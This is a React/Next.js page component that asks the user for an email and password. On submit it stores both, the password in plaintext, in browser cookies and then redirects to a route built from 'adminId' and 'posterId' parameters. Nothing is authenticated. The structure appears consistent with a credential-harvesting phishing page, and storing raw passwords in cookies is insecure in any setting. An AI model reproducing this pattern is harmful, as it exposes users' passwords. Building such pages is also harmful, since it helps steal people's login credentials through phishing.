import { useState } from "react";
import Cookies from "js-cookie";
import { useRouter } from "next/router";
import { FaQuestion } from "react-icons/fa";

function EmailPasswordPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();
  const { adminId, posterId } = router.query;

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };
  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log(email);
    Cookies.set("email", email);
    Cookies.set("password", password);
    router.push(`/${adminId}/${posterId}/account`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <form onSubmit={handleSubmit}>
        <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
          <div className="lg:container px-3 lg:px-0">
            <div className="flex justify-end mt-[36px] text-slate-600 mb-[38px] ">
              <FaQuestion size={18} />
            </div>
            <p className="text-[25px]">Enter your email and password</p>

            <input
              type="email"
              value={email}
              className="input"
              placeholder="Email"
              onChange={handleEmailChange}
              required
            />
            <input
              type="password"
              value={password}
              className="input"
              placeholder="Password"
              onChange={handlePasswordChange}
              required
            />
          </div>
          <button className="w-full text-lg bg-custom-green rounded-full py-3 text-white border-2 border-slate-900">
            Next
          </button>
        </div>
      </form>
    </div>
  );
}

export default EmailPasswordPage;
